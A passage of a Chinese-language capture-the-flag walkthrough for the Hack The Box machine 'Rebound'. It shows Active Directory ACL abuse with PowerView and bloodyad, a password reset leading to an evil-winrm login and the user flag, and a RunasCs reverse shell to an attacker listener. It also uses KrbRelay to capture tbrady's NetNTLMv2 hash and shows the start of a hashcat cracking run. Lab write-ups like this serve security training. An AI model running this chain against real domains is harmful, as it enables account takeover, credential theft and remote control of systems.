sAMAccountType                    : SAM_USER_OBJECT
servicePrincipalName              : ldapmonitor/dc01.rebound.htb
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
lastLogonTimestamp                : 06/08/2026 10:05:35 (today)
vulnerabilities                   : [VULN-001] Kerberoastable account (MEDIUM)
                                    [VULN-002] User account with password that never expires (LOW)

```

根据得到的 objectSid 做进一步查询。

可以看到 oorend 用户对 ServiceMgmt 拥有 Self 权限，类型为 ACCESS_ALLOWED_ACE。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainObjectAcl -SecurityIdentifier S-1-5-21-4078382237-1492182817-2568127209-7682
[2026-08-06 08:52:13] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while
ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : Self
AccessMask                  : Self
InheritanceType             : None
SecurityIdentifier          : REBOUND\oorend

```

查看 OU。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainOU
objectClass               : top
                            organizationalUnit
ou                        : Service Users
distinguishedName         : OU=Service Users,DC=rebound,DC=htb
instanceType              : 4
whenCreated               : 08/04/2023 09:07:56 (3 years, 3 months ago)
whenChanged               : 06/08/2026 13:24:02 (today)
uSNCreated                : 69325
uSNChanged                : 185338
name                      : Service Users
objectGUID                : {fc826af9-06f9-47e7-866e-4c3c015638b8}
objectCategory            : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=rebound,DC=htb
dSCorePropagationData     : 08/06/2026 13:24:02 PM
                            08/06/2026 13:24:00 PM
                            08/06/2026 13:17:02 PM
                            08/06/2026 13:17:00 PM
                            01/01/1601 00:00:00 AM

objectClass               : top
                            organizationalUnit
ou                        : Domain Controllers
distinguishedName         : OU=Domain Controllers,DC=rebound,DC=htb
instanceType              : 4
whenCreated               : 07/04/2023 14:01:41 (3 years, 3 months ago)
whenChanged               : 07/04/2023 14:01:41 (3 years, 3 months ago)
uSNCreated                : 5804
uSNChanged                : 5804
name                      : Domain Controllers
objectGUID                : {80923a93-fed7-4fe0-b3c7-980864dc3f78}
objectCategory            : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=rebound,DC=htb
gPLink                    : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=rebound,DC=htb;0]
dSCorePropagationData     : 04/08/2023 09:07:56 AM
                            04/07/2023 14:01:59 PM
                            01/01/1601 00:04:16 AM

```

Domain Controlers 无权限。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainObjectAcl -Identity "OU=Domain Controllers,DC=rebound,DC=htb" -ResolveGUIDs -SecurityIdentifier ServiceMGMT

```

查看 Service Users 这个 OU。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainObjectAcl -Identity "OU=Service Users,DC=rebound,DC=htb" -ResolveGUIDs -SecurityIdentifier ServiceMGMT 
ObjectDN                    : OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : None
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : FullControl
AccessMask                  : FullControl
InheritanceType             : None
SecurityIdentifier          : REBOUND\ServiceMgmt
```

有完整控制权限，看看 Service Users 这个 OU 对外延展出哪些能力。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainObject -SearchBase "OU=Service Users,DC=rebound,DC=htb"
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : batch_runner
distinguishedName                 : CN=batch_runner,OU=Service Users,DC=rebound,DC=htb
instanceType                      : 4
whenCreated                       : 08/04/2023 09:07:56 (3 years, 3 months ago)
whenChanged                       : 06/08/2026 13:41:01 (today)
uSNCreated                        : 69335
uSNChanged                        : 185396
name                              : batch_runner
objectGUID                        : {fa00c3b6-5e6a-48b9-9fe0-897389addf60}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
codePage                          : 0
countryCode                       : 0
badPasswordTime                   : 08/04/2023 16:22:25 (3 years, 3 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 09/04/2023 10:22:12 (3 years, 3 months ago)
logonHours                        : ////////////////////////////
pwdLastSet                        : 06/08/2026 13:41:01 (today)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-7685
accountExpires                    : 1601-01-01 00:00:00+00:00
logonCount                        : 11
sAMAccountName                    : batch_runner
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
dSCorePropagationData             : 08/06/2026 13:41:01 PM
                                    08/06/2026 13:38:02 PM
                                    08/06/2026 13:38:01 PM
                                    08/06/2026 13:38:00 PM
                                    01/01/1601 00:00:00 AM
lastLogonTimestamp                : 09/04/2023 10:07:10 (3 years, 3 months ago)
vulnerabilities                   : [VULN-002] User account with password that never expires (LOW)

objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : winrm_svc
distinguishedName                 : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
instanceType                      : 4
whenCreated                       : 08/04/2023 09:07:56 (3 years, 3 months ago)
whenChanged                       : 06/08/2026 13:41:01 (today)
uSNCreated                        : 69329
memberOf                          : CN=Remote Management Users,CN=Builtin,DC=rebound,DC=htb
uSNChanged                        : 185393
name                              : winrm_svc
objectGUID                        : {e3c7114f-5864-4115-b3fb-4587e25790f5}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
codePage                          : 0
countryCode                       : 0
badPasswordTime                   : 08/04/2023 16:22:25 (3 years, 3 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 08/04/2023 17:03:38 (3 years, 3 months ago)
logonHours                        : ////////////////////////////
pwdLastSet                        : 06/08/2026 13:41:00 (today)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-7684
accountExpires                    : 1601-01-01 00:00:00+00:00
logonCount                        : 3
sAMAccountName                    : winrm_svc
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
dSCorePropagationData             : 08/06/2026 13:41:01 PM
                                    08/06/2026 13:38:02 PM
                                    08/06/2026 13:38:01 PM
                                    08/06/2026 13:38:00 PM
                                    01/01/1601 00:00:00 AM
lastLogonTimestamp                : 25/08/2023 21:41:16 (2 years, 11 months ago)
vulnerabilities                   : [VULN-002] User account with password that never expires (LOW)

objectClass               : top
                            organizationalUnit
ou                        : Service Users
distinguishedName         : OU=Service Users,DC=rebound,DC=htb
instanceType              : 4
whenCreated               : 08/04/2023 09:07:56 (3 years, 3 months ago)
whenChanged               : 06/08/2026 13:38:02 (today)
uSNCreated                : 69325
uSNChanged                : 185390
name                      : Service Users
objectGUID                : {fc826af9-06f9-47e7-866e-4c3c015638b8}
objectCategory            : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=rebound,DC=htb
dSCorePropagationData     : 08/06/2026 13:38:02 PM
                            08/06/2026 13:38:00 PM
                            08/06/2026 13:31:02 PM
                            08/06/2026 13:31:00 PM
                            01/01/1601 00:00:00 AM

```

有一个用户 winrm_svc。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainGroup -MemberIdentity "winrm_svc"
objectClass           : top
                        group
cn                    : Remote Management Users
description           : Members of this group can access WMI resources over management protocols (such as WS-Management via 
                        the Windows Remote Management service). This applies only to WMI namespaces that grant access to the
                         user.
member                : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
distinguishedName     : CN=Remote Management Users,CN=Builtin,DC=rebound,DC=htb
instanceType          : 4
name                  : Remote Management Users
objectGUID            : {263ebfb8-61f1-4f04-97d1-c0e7399e85c8}
objectSid             : S-1-5-32-580
sAMAccountName        : Remote Management Users
sAMAccountType        : SAM_ALIAS_OBJECT
groupType             : -2147483643
objectCategory        : CN=Group,CN=Schema,CN=Configuration,DC=rebound,DC=htb

```

查看加组前的用户。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainGroupMember -Identity servicemgmt
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : fflock
MemberDistinguishedName     : CN=fflock,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-3382

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

```

加组操作。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]                                                                                                       
╰─ ❯ Add-DomainGroupMember -Identity servicemgmt -Members oorend                                                                                                        
[2026-08-06 09:55:55] [Add-DomainGroupMember] Successfully added oorend to group servicemgmt                                                                            
[2026-08-06 09:55:55] User oorend successfully added to servicemgmt                                                                                                   ****
```

使用 bloodyad 将加组操作简单化。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo bloodyad -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.129.232.31 add groupMember ServiceMgmt oorend                                                 
[+] oorend added to ServiceMgmt
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo bloodyad -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.129.232.31 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB

```

修改 winrm_svc 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo bloodyad -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.129.232.31 set password winrm_svc 'P@sswd!'
[+] Password changed successfully!
```

验证密码的正确性。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ nxc winrm rebound.htb -u winrm_svc -p 'P@sswd!'                             
WINRM       10.129.18.212   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.18.212   5985   DC01             [+] rebound.htb\winrm_svc:P@sswd! (Pwn3d!)
```

使用修改后的密码登录 winrm_svc，得到 userflag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ evil-winrm -i rebound.htb -u winrm_svc -p 'P@sswd!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
rebound\winrm_svc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt
819ea7b7a9b6710d83065ef22a35ddc2

```

## 提权

查看进程信息。

explorer 代表桌面交互进程，SI（Session Indicator）为 1 表示进程运行在用户交互会话中，可能有活跃用户。输入法和文本服务相关的 ctfmon、搜索界面相关的 SearchUI 和管理桌面 UI 相关的 ShellExperienceHost 等，SI 也都是 1，表明由用户交互中。

在 Windows 系统中，SI 用于指示进程所属的会话类型。si=0 表示进程运行在系统服务会话中，主要包括核心后台进程和系统服务，如 lsass、services 等，这些进程不与用户直接交互；而 si=1 或更高表示进程属于交互式用户会话，如 explorer、ctfmon、ShellExperienceHost。

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> get-process                                                                                                                                                                                                                                                                                                                                                                 22:03 [0/0]
                                                                                                                                                    
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                               
-------  ------    -----      -----     ------     --  -- -----------                                                                               
    449      33    12672      20928              2860   0 certsrv                                                                                   
     84       5      900       3700              5692   0 CompatTelRunner                                                                           
    158      10     6632       4184              1944   0 conhost                                                                                   
    453      18     2012       5428               388   0 csrss                                                                                     
    256      16     1936       5172               500   1 csrss                                                                                     
    356      15     3480      14880               512   1 ctfmon                                                                                    
    395      33    15656      22096              2948   0 dfsrs                                                                                     
    173      11     2236       7496              2180   0 dfssvc                                                                                    
    301      14     4008      13796              3892   0 dllhost                                                                                   
   5383    4794    69624      69976              2968   0 dns                                                                                       
    597      25    24584      51996                60   1 dwm                                                                                       
   1485      57    23444      82924              5164   1 explorer                                                                                  
     53       6     1712       4816              2812   1 fontdrvhost                                                                               
     53       6     1500       4164              2816   0 fontdrvhost                                                                               
      0       0       56          8                 0   0 Idle                                                                                      
    142      12     2152       5924              3000   0 ismserv                                                                                   
   2022     129    70244      58932               648   0 lsass                                                                                     
    484      34    48028      60900              2852   0 Microsoft.ActiveDirectory.WebServices                                                     
    266      14     3372      10752              4352   0 msdtc                                                                                     
    580      87   211376     140636              2552   0 MsMpEng                                                                                   
      0      13      408      13336                88   0 Registry                                                                                  
    147       8     1628       7908              2516   1 RuntimeBroker                                                                             
    290      15     5328      20336              6196   1 RuntimeBroker                                                                             
    230      12     2288      12840              6644   1 RuntimeBroker                                                                             
    676      33    20124      64552              6136   1 SearchUI                                                                                  
    603      14     5460      13212               628   0 services                                                                                  
    682      28    14920      53596              3636   1 ShellExperienceHost                                                                       
    449      17     4888      24948              5860   1 sihost                                                                                    
     53       3      508       1192               288   0 smss                                                                                      
    209      12     1660       7364               340   0 svchost                                                                                   
    133      16     3352       7536               356   0 svchost                   
    215       9     1836       7288               708   0 svchost                   
    310      20    10540      15136               748   0 svchost                   
    218      12     2060      10088               772   0 svchost                   
    175       9     1820      11980               784   0 svchost                   
     89       5      872       3908               852   0 svchost                         
    903      20     6544      21948               872   0 svchost                                
    865      19     4648      11796               916   0 svchost                                
    256      11     1940       7832               964   0 svchost                                
    250      13     2796       8932               984   0 svchost                                
    225      10     2344       9312              1084   0 svchost                                
    421      33     8032      16676              1132   0 svchost                                        
    387      13    15876      19956              1144   0 svchost                                        
    355      15     4220      12004              1228   0 svchost                                                             
    272      13     4068      11432              1268   0 svchost                                                             
    221      12     2112       9392              1280   0 svchost                                                             
    472      19     3428      12468              1296   0 svchost                                                             
    269      16     2816      11948              1308   0 svchost                                                             
    250      12     2736      11816              1328   0 svchost                                                             
    441       9     2756       9188              1352   0 svchost                                                             
    146       7     1208       5860              1396   0 svchost                                                             
    172      11     1824       8324              1484   0 svchost                                                             
    336      10     2448       8676              1512   0 svchost                                                             
    376      17     4648      14164              1520   0 svchost
    314      13     2084       9108              1604   0 svchost
    193      12     2112      12196              1684   0 svchost
    268      13     2456       8072              1800   0 svchost              
    166       8     1788       7224              1808   0 svchost              
    168      12     1636       7428              1816   0 svchost              
    426      16     9972      19480              1896   0 svchost              
    145       9     1628       7256              1972   0 svchost              
    247      25     3136      12552              2252   0 svchost              
    152       9     1556       6776              2460   0 svchost              
    179      11     2272      13668              2504   0 svchost              
    172       9     1568       7500              2520   0 svchost              
    210      11     2224       8764              2708   0 svchost              
    144       7     1296       5924              2904   0 svchost              
    113       7     1096       5492              2920   0 svchost                         
    446      19    13480      28172              2940   0 svchost                         
    138       9     1524       6700              3052   0 svchost                         
    138       8     1516       6380              3068   0 svchost                         
    275      20     3164      12392              3308   0 svchost                         
    223      12     2072       7684              3324   0 svchost                         
    338      24     8940      16896              3648   0 svchost                         
    267      14     3112      13952              4288   0 svchost                         
    239      13     3048      12728              4640   0 svchost                         
    128       7     1376       6408              4808   0 svchost                         
    319      17     6480      22304              4828   0 svchost                         
    409      26     3600      13312              4864   0 svchost                         
    245      12     2972      13056              5876   1 svchost                         
    347      17     5004      25280              5908   1 svchost                         
    239      13     3044      14212              5968   0 svchost                         
    171       9     3864      12236              6124   0 svchost                         
    288      15    10748      13076              6420   0 svchost                         
   1768       0      188        160                 4   0 System                                         
    206      18     3184      11468              5960   1 taskhostw                                      
    215      16     2448      10868              3780   0 vds                                            
    172      11     2876      11556              2072   0 VGAuthService                                  
    149       8     1796       7296              2120   0 vm3dservice                                    
    150      10     1952       7880              3332   1 vm3dservice                                    
    403      23     9880      22940              2420   0 vmtoolsd                                       
    252      18     5236      15792              6788   1 vmtoolsd                                       
    172      11     1400       7120               492   0 wininit                                        
    285      12     2592      12512               556   1 winlogon                                       
    344      16     7632      16632              3836   0 WmiPrvSE                                       
    328      18    28156      38288              4588   0 WmiPrvSE                                       
    663      27    51428      67412       0.38   4480   0 wsmprovhost  
```

qwinsta 是 Windows 系统中一个命令行工具，全称是 Query WINdows STAtion，用于查询当前系统中所有的会话状态。

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> qwinsta
qwinsta.exe : No session exists for *
    + CategoryInfo          : NotSpecified: (No session exists for *:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

制作一个自动登录脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]                                                                                                                                               
└─$ vim login.sh                                                                                                                                                                    

┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ cat login.sh      
#! /bin/bash

sudo bloodyad -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.129.232.31 add groupMember ServiceMgmt oorend
sudo bloodyad -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.129.232.31 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
sudo bloodyad -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.129.232.31 set password winrm_svc 'P@sswd!'
evil-winrm -i rebound.htb -u winrm_svc -p 'P@sswd!'

┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ chmod +x login.sh
```

使用 RunasCs 反弹 shell 到 443 端口。

```bash
*Evil-WinRM* PS C:\apps> .\RunasCs.exe winrm_svc P@sswd! powershell -d rebound.htb -r 10.10.16.151:443 -t 0 -l 9

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1354d60$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2768 created in background.

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.232.31] 59371
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 
```

查看 qwinsta，一个 ID 为 0，名称为 services 的会话显示断开；ID 为 1，名称为 console 的会话，用户名为 tbrady，状态为活跃。

```bash
rebound\winrm_svc
PS C:\Windows\system32> qwinsta
qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console           tbrady                    1  Active 
```

加载 PowerView.ps1，枚举所有用户。

确实存在 tbrady，是活跃中的。

```bash
PS C:\apps> . .\PowerView.ps1
. .\PowerView.ps1
PS C:\apps> get-domainuser -properties samaccountname
get-domainuser -properties samaccountname

samaccountname
--------------
Administrator 
Guest         
krbtgt        
ppaul         
llune         
fflock        
jjones        
mmalone       
nnoon         
ldap_monitor  
oorend        
winrm_svc     
batch_runner  
tbrady 
```

枚举信息，刚刚登陆过。

```bash
PS C:\apps> get-domainuser -identity tbrady
get-domainuser -identity tbrady


logoncount                    : 44
badpasswordtime               : 4/8/2023 9:22:25 AM
distinguishedname             : CN=tbrady,CN=Users,DC=rebound,DC=htb
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 8/10/2026 1:54:05 AM
name                          : tbrady
objectsid                     : S-1-5-21-4078382237-1492182817-2568127209-7686
samaccountname                : tbrady
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 8/10/2026 8:54:05 AM
instancetype                  : 4
usncreated                    : 69346
objectguid                    : d9ee43f7-de07-42ee-9f51-cd9c1f37e111
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
dscorepropagationdata         : {8/25/2023 10:05:00 PM, 1/1/1601 12:00:00 AM}
lastlogon                     : 8/10/2026 1:54:05 AM
badpwdcount                   : 0
cn                            : tbrady
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 4/8/2023 9:08:31 AM
primarygroupid                : 513
pwdlastset                    : 4/8/2023 2:08:31 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 184371

```

枚举服务账户。

```bash
PS C:\apps> Get-ADServiceAccount -Filter *
Get-ADServiceAccount -Filter *


DistinguishedName : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
Enabled           : True
Name              : delegator
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : c9da97ae-5e35-44d2-aa15-114aecdc0caf
SamAccountName    : delegator$
SID               : S-1-5-21-4078382237-1492182817-2568127209-7687
UserPrincipalName : 
```

只有一个服务账户，看名字可能是委派。

```bash
PS C:\apps> get-domainuser -properties samaccountname,memberof
get-domainuser -properties samaccountname,memberof

samaccountname memberof                                                                                                
-------------- --------                                                                                                
Administrator  {CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb, CN=Domain Admins,CN=Users,DC=rebound,DC=h...
Guest          CN=Guests,CN=Builtin,DC=rebound,DC=htb                                                                  
krbtgt         CN=Denied RODC Password Replication Group,CN=Users,DC=rebound,DC=htb                                    
ppaul          CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb                                                               
llune                                                                                                                  
fflock         CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb                                                               
jjones                                                                                                                 
mmalone                                                                                                                
nnoon                                                                                                                  
ldap_monitor                                                                                                           
oorend         CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb                                                               
winrm_svc      CN=Remote Management Users,CN=Builtin,DC=rebound,DC=htb                                                 
batch_runner                                                                                                           
tbrady
```

Get-DomainObjectAcl -ResolveGUIDs 的功能是获取域中所有对象的访问控制列表（ACL）。-ResolveGUIDs 将 ACL 中的 GUID 转换为更易读的名称，Where-Object 用于对 Get-DomainObjectAcl 的结果进行筛选，通过指定条件来缩小返回数据的范围。

```bash
PS C:\apps> Get-DomainObjectAcl | Where-Object { $_.SecurityIdentifier -eq "S-1-1-0" -and $_.ObjectDN -match "CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb" }
Get-DomainObjectAcl | Where-Object { $_.SecurityIdentifier -eq "S-1-1-0" -and $_.ObjectDN -match "CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb" }


ObjectDN               : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
ObjectSID              : S-1-5-21-4078382237-1492182817-2568127209-7687
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 40
AceQualifier           : AccessDenied
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-1-0
AceType                : AccessDeniedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

ObjectDN               : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
ObjectSID              : S-1-5-21-4078382237-1492182817-2568127209-7687
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : e362ed86-b728-0842-b27d-2dea7a9df218
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 40
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-1-0
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
```

上传 krbrelay.exe。

```bash
*Evil-WinRM* PS C:\apps> upload KrbRelay.exe
                                        
Info: Uploading /home/kali/Work/Kali/Rebound/KrbRelay.exe to C:\apps\KrbRelay.exe
                                        
Data: 2207744 bytes of 2207744 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\apps> dir


    Directory: C:\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/10/2026   7:18 AM        1655808 KrbRelay.exe
-a----        8/10/2026   3:12 AM         770279 PowerView.ps1
-a----        8/10/2026   2:11 AM          51712 RunasCs.exe

```

```bash
PS C:\apps> .\RunasCs.exe oorend '1GR8t@$$4u' -l 9 "c:\programdata\apps\KrbRelay.exe -ntlm -session 1 -clsid 38e441fb-3d16-422f-8750 b2dacec5cefc -port 95" [*] Auth Context: rebound\tbrady [*] Rewriting function table [*] Rewriting PEB [*] GetModuleFileName: System [*] Init com server [*] GetModuleFileName: c:\programdata\apps\KrbRelay.exe [*] Register com server objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADL+MZkILLdsWFuuHa9cyN2AuQAAMQD///gSD sNbKo+LSIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAA fAP//AAAOAP//AAAAAA==: [*] Forcing cross-session authentication [*] Using CLSID: 38e441fb-3d16-422f-8750-b2dacec5cefc [*] Spawning in session 1 [*] NTLM1 4e544c4d535350000100000097b208e2070007002c00000004000400280000000a0063450000000f44433 0315245424f554e44 [*] NTLM2 4e544c4d53535000020000000e000e003800000015c289e27e75a6761804e084000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800006f9e4f4f70db010000000000000000000000006 500780065000000300039002d003700040002000b000000 [*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED [*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons [*] NTLM3 tbrady::rebound:7e75a6761804e084:26a0a51afa084cd44c4738d0de4fa4cb:0101000000000000006 f9e4f4f70db01892724e8dbdb603b0000000002000e007200650062006f0075006e006400010008004400 430030003100040016007200650062006f0075006e0064002e00680074006200030020006400630030003 1002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064 002e0068007400620007000800006f9e4f4f70db010600040006000000080030003000000000000000010 000000020000056ad783ae796ab6c89c592edc51e80d08ac5a550ded4dda3882dd6156297a55f0a001000 00000000000000000000000000000000090000000000000000000000 System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)) at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults) at KrbRelay.Program.Main(String[] args)
```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo hashcat -m 5600 'tbrady::rebound:7e75a6761804e084:26a0a51afa084cd44c4738d0de4fa4cb:0101000000000000006f9e4f4f70db01892724e8dbdb603b0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800006f9e4f4f70db010600040006000000080030003000000000000000010000000020000056ad783ae796ab6c89c592edc51e80d08ac5a550ded4dda3882dd6156297a55f0a00100000000000000000000000000000000000090000000000000000000000' /usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27784 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
